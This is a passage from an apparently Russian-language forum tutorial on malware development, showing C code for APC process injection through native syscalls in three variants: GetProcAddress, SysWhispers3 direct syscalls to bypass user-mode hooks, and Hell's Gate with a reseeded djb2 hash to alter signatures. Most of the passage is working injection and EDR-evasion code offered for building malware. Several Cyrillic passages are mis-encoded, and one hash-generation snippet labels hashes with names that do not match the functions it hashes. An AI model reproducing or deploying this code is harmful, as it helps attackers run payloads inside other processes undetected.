		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _Syscall {

fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
fnNtQueueApcThread        pNtQueueApcThread;
} Syscall, * PSyscall;</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;St&#039;</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeSyscallStruct(OUT PSyscall St) {

rust
Copy code
HMODULE hNtdll =  GetModuleHandle(L&quot;NTDLL.DLL&quot;);
if (!hNtdll) {
    printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, &quot;NtProtectVirtualMemory&quot;);
St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
St-&gt;pNtQueueApcThread         = (fnNtQueueApcThread)GetProcAddress(hNtdll, &quot;NtQueueApcThread&quot;);

// –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ GetProcAddress –Ω–µ –ø—Ä–æ–ø—É—Å—Ç–∏–ª —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤
if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtQueueApcThread == NULL)
    return FALSE;
else
    return TRUE;
}</code></pre>
	</div>
</div><br />
–î–∞–ª–µ–µ —Ñ—É–Ω–∫—Ü–∏—è ApcInjectionViaSyscalls –±—É–¥–µ—Ç –æ—Ç–≤–µ—á–∞—Ç—å –∑–∞ –≤—ã–¥–µ–ª–µ–Ω–∏–µ, –∑–∞–ø–∏—Å—å –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ pPayload –≤ —Ü–µ–ª–µ–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ hProcess. –û–Ω–∞ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –∂–µ—Ä—Ç–≤–µ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ hThread. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç FALSE, –µ—Å–ª–∏ –Ω–µ —É–¥–∞–µ—Ç—Å—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –∏ TRUE, –µ—Å–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ—à–ª–æ —É—Å–ø–µ—à–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

Syscall     St                      = { 0 };
NTSTATUS    STATUS                  = NULL;
PVOID       pAddress                = NULL;
ULONG       uOldProtection          = NULL;
SIZE_T      sSize                   = sPayloadSize,
            sNumberOfBytesWritten   = NULL;

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;St&#039; –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤
if (!InitializeSyscallStruct(&amp;St)) {
    printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
    return FALSE;
}

// –í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏
if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
//--------------------------------------------------------------------------

// –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
    printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);
//--------------------------------------------------------------------------

// –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –ø–∞–º—è—Ç–∏ –Ω–∞ RWX
if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
    printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
//--------------------------------------------------------------------------

// –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Å –ø–æ–º–æ—â—å—é NtQueueApcThread

printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
if ((STATUS = St.pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
    printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º SysWhispers</b><br />
<br />
–ó–¥–µ—Å—å —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç SysWhispers3 –¥–ª—è –æ–±—Ö–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —Ö—É–∫–æ–≤ —á–µ—Ä–µ–∑ –ø—Ä—è–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã. –î–ª—è —ç—Ç–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Å–ª–µ–¥—É—é—â–∞—è –∫–æ–º–∞–Ω–¥–∞ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö —Ñ–∞–π–ª–æ–≤.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtQueueApcThread -o SysWhispers -v</code></pre>
	</div>
</div><br />
–ì–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è —Ç—Ä–∏ —Ñ–∞–π–ª–∞: SysWhispers.h, SysWhispers.c –∏ SysWhispers-asm.x64.asm.<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –∏–º–ø–æ—Ä—Ç —ç—Ç–∏—Ö —Ñ–∞–π–ª–æ–≤ –≤ Visual Studio, –∫–∞–∫ –±—ã–ª–æ –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ —Ä–∞–Ω–µ–µ. –§—É–Ω–∫—Ü–∏—è ApcInjectionViaSyscalls –ø—Ä–∏–≤–µ–¥–µ–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

Syscall     St                      = { 0 };
NTSTATUS    STATUS                  = NULL;
PVOID       pAddress                = NULL;
ULONG       uOldProtection          = NULL;
SIZE_T      sSize                   = sPayloadSize,
            sNumberOfBytesWritten   = NULL;

// –í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏
if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
//--------------------------------------------------------------------------

// –ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
    printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);
//--------------------------------------------------------------------------

// –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –ø–∞–º—è—Ç–∏ –Ω–∞ RWX
if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
    printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
//--------------------------------------------------------------------------

// –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Å –ø–æ–º–æ—â—å—é NtQueueApcThread

printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
if ((STATUS = NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
    printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Hell&#039;s Gate</b><br />
<br />
–ü–æ—Å–ª–µ–¥–Ω—è—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –¥–ª—è —ç—Ç–æ–≥–æ –º–æ–¥—É–ª—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Hell&#039;s Gate. –°–Ω–∞—á–∞–ª–∞ —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –∑–¥–µ—Å—å –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è —Ç–µ –∂–µ —à–∞–≥–∏, —á—Ç–æ –∏ –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–æ–µ–∫—Ç–∞ Visual Studio —Å SysWhispers3. –í —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –≤–∫–ª—é—á–µ–Ω–∏–µ MASM –∏ –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Å–≤–æ–π—Å—Ç–≤ –¥–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ —Ñ–∞–π–ª–∞ ASM —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Microsoft Macro Assembler.<br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã VX_TABLE</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
VX_TABLE_ENTRY NtAllocateVirtualMemory;
VX_TABLE_ENTRY NtWriteVirtualMemory;
VX_TABLE_ENTRY NtProtectVirtualMemory;
VX_TABLE_ENTRY NtQueueApcThread;
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —á–∏—Å–ª–∞ (seed)</b><br />
<br />
–î–ª—è <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank" class="link link--external" rel="noopener">–∑–∞–º–µ–Ω—ã —Å—Ç–∞—Ä–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è</a> –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —á–∏—Å–ª–∞ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, —á—Ç–æ–±—ã –∏–∑–º–µ–Ω–∏—Ç—å —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –§—É–Ω–∫—Ü–∏—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è djb2 –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è –Ω–æ–≤—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —á–∏—Å–ª–∞, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
–°–ª–µ–¥—É—é—â–∏–µ –æ–ø–µ—Ä–∞—Ç–æ—Ä—ã printf –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –¥–æ–±–∞–≤–ª–µ–Ω—ã –≤ –Ω–æ–≤—ã–π –ø—Ä–æ–µ–∫—Ç –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏–π djb2 (–ü–æ –∞–Ω–∞–ª–æ–≥–∏–∏ —Å –ø—Ä–∏–º–µ—Ä–∞–º–∏ –≤—ã—à–µ, –Ω–∞–ø–∏—à–∏—Ç–µ –∫–æ–Ω—Å–æ–ª—å–Ω—É—é –ø—Ä–æ–≥—Ä–∞–º–º—É).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtAllocateVirtualMemory&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtWriteVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtProtectVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtQueueApcThread&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
–ü–æ—Å–ª–µ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∑–Ω–∞—á–µ–Ω–∏–π –¥–æ–±–∞–≤—å—Ç–µ –∏—Ö –≤ –Ω–∞—á–∞–ª–æ –ø—Ä–æ–µ–∫—Ç–∞ Hell&#039;s Gate.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define NtAllocateVirtualMemory_djb2 0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2    0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2  0xA0DCC2851566E832
#define NtQueueApcThread_djb2        0x331E6B6B7E696022</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è ApcInjectionViaSyscalls</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>BOOL ApcInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    Syscall     St                      = { 0 };
    NTSTATUS    STATUS                  = NULL;
    PVOID       pAddress                = NULL;
    ULONG       uOldProtection          = NULL;
    SIZE_T      sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;

    // Allocating memory
    HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);

//--------------------------------------------------------------------------

    // Writing the payload
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // Changing the memory&#039;s permissions to RWX
    HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------

    // Executing the payload via NtQueueApcThread

    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
    HellsGate(pVxTable-&gt;NtQueueApcThread.wSystemCall);
    if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);


    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–£–¥–∞–ª–µ–Ω–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è</b><br />
<br />
–í–æ–∑–º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é ApcInjectionViaSyscalls –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤ –ø—Ä–æ—Ü–µ—Å—Å, –Ω–æ –¥–ª—è —ç—Ç–æ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å. –≠—Ç–æ—Ç –ø–æ–¥—Ö–æ–¥ –æ–±—Å—É–∂–¥–∞–ª—Å—è <a href="https://ru-sfera.pw/threads/razrabotka-virusov-19-izuchaem-texniku-apc-injection.4451/" target="_blank" class="link link--external" rel="noopener">–∑–¥–µ—Å—å</a><br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–û—Å–Ω–æ–≤–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é (<a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L49" target="_blank" class="link link--external" rel="noopener">wmain</a>) –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –æ–±–Ω–æ–≤–∏—Ç—å –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ ApcInjectionViaSyscalls <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">–≤–º–µ—Å—Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</a><br />
<br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è </b><br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º SysWhispers.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786936098.png"
		data-src="https://osint42.org/attachments/1746786936098-png.239/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786936098-png.239/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786936098.png"
			title="1746786936098.png"
			width="1881" height="916" loading="lazy" />
	</div><br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ Hell&#039;s Gate<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786944668.png"
		data-src="https://osint42.org/attachments/1746786944668-png.240/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786944668-png.240/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786944668.png"
			title="1746786944668.png"
			width="1845" height="816" loading="lazy" />
	</div></div>
						

							<h2>–ß–µ—Ä–ø–∞–µ–º —Å–∏–ª—ã –≤ –∞–Ω—Ç–∏–æ—Ç–ª–∞–¥–∫–µ</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746787126106.png"
		data-src="https://osint42.org/attachments/1746787126106-png.241/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787126106-png.241/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787126106.png"
			title="1746787126106.png"
			width="600" height="375" loading="lazy" />
	</div><br />
<br />
